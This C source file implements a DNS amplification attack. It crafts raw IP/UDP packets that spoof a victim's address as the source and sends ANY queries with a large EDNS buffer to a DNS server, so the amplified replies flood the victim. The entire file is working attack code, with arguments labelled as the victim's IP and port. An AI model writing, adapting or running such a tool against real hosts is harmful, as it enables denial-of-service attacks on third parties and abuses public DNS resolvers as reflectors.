#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <time.h>
#include "dns_attack.h"

//Copy it from Github
unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}
void site_transform(unsigned char *site_trans, unsigned char *site){
    strcat(site,".");
    int len=0;
    for(int i=0;i<strlen(site);i++){
        if(site[i]=='.'){
            *site_trans++ = len;
            for(int j=i-len;j<i;j++){
                *site_trans++=site[j];
            }
            len=0;
        }
        else{
            len+=1;
        }
    }
    *site_trans++=0x00;
    return ;
}
void sending_pkt(char *src_ip, int src_port, char *dns_ip, int dns_port, unsigned char *query_site){
    int sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock_raw==-1){
        printf("Please run it as root!\n");
    }

    char buffer[128], *pseudo_header_buffer;
    memset(buffer, 0, 128);
    
    //Building DNS Header
    dns_header *dns = (dns_header*)(buffer+sizeof(ip_header)+sizeof(udp_header));
    dns->q_ID = (unsigned short)htons(0xEDCC);
    dns->flag = htons(0x0100);
    dns->qc = htons(1);
    dns->ans_c = 0;
    dns->ac = 0;
    dns->add = htons(1);

    //Transform the Query Site
    unsigned char site[100], *site_trans;
    site_trans=(unsigned char*)&buffer[sizeof(ip_header)+sizeof(udp_header)+sizeof(dns_header)];
    strcpy(site, query_site);
    site_transform(site_trans, site);

    //Building DNS Question Field
    question *ques;
    ques = (question*)&buffer[sizeof(ip_header)+sizeof(udp_header)+sizeof(dns_header)+(strlen(query_site)+2)];
    ques->qtype = htons(255);
    ques->qclass = htons(1);

    //Building DNS OPT Field
    optrr *opt;
    opt=(optrr*)&buffer[sizeof(ip_header)+sizeof(udp_header)+sizeof(dns_header)+(strlen(query_site)+2)+sizeof(question)];
    opt->name = 0;
    opt->type = htons(41);
    opt->class = htons(4096);
    opt->extended = 0;
    opt->version = 0;
    opt->do_and_z = htons(0x8000);
    opt->len = 0;
    
    //Building IP Header
    ip_header *ip = (ip_header*)buffer;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(ip_header)+sizeof(udp_header)+sizeof(dns_header)+(strlen(query_site)+2)+sizeof(question)+sizeof(optrr);
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(src_ip);
    ip->daddr = inet_addr(dns_ip);
    ip->check = htons(csum((unsigned short*)buffer, ip->tot_len));

    //Building UDP Header
    udp_header *udp = (udp_header*)(buffer+sizeof(ip_header));
    udp->source = htons(src_port);
    udp->dest = htons(dns_port);
    udp->len = htons(sizeof(udp_header)+sizeof(dns_header)+(strlen(query_site)+2)+sizeof(question)+sizeof(optrr));
    udp->check = 0;
    
    //Calculating the Checksum oh UDP Header
    pseudo ps;
    ps.saddr = inet_addr(src_ip);
    ps.daddr = inet_addr(dns_ip);
    ps.filler = 0;
    ps.protocol = IPPROTO_UDP;
    ps.len = htons(sizeof(udp_header)+sizeof(dns_header)+(strlen(query_site)+2)+sizeof(question)+sizeof(optrr));
    int siz=sizeof(pseudo)+sizeof(udp_header)+sizeof(dns_header)+(strlen(query_site)+2)+sizeof(question)+sizeof(optrr);
    
    pseudo_header_buffer=malloc(siz);
    
    memcpy(pseudo_header_buffer, (unsigned char*)&ps, sizeof(pseudo));
    memcpy(pseudo_header_buffer+sizeof(pseudo), udp, sizeof(udp_header)+sizeof(dns_header)+(strlen(site_trans)+2)+sizeof(question)+sizeof(optrr));
    udp->check = csum((unsigned short*)pseudo_header_buffer, siz);
    
    //Building Socket Address Package
    struct sockaddr_in soc_in;
    soc_in.sin_family = AF_INET;
    soc_in.sin_port = htons(dns_port);
    soc_in.sin_addr.s_addr = inet_addr(dns_ip);
    
    //Sending Package
    sendto(sock_raw, buffer, ip->tot_len, 0, (struct sockaddr *)&soc_in, sizeof(soc_in));
    free(pseudo_header_buffer);
    close(sock_raw);
    return;
}
int main(int argc, char*argv[]){
    
    //Get the IP and Port From Command Line
    char *vicim_IP=argv[1];
    int victim_port=atoi(argv[2]);
    char *dns_IP=argv[3];
    
    //Sending Queries for Three Times
    for(int i=0;i<3;i++){
        sending_pkt(vicim_IP, victim_port, dns_IP, 53, "shopee.tw/");
    }

    return 0;
}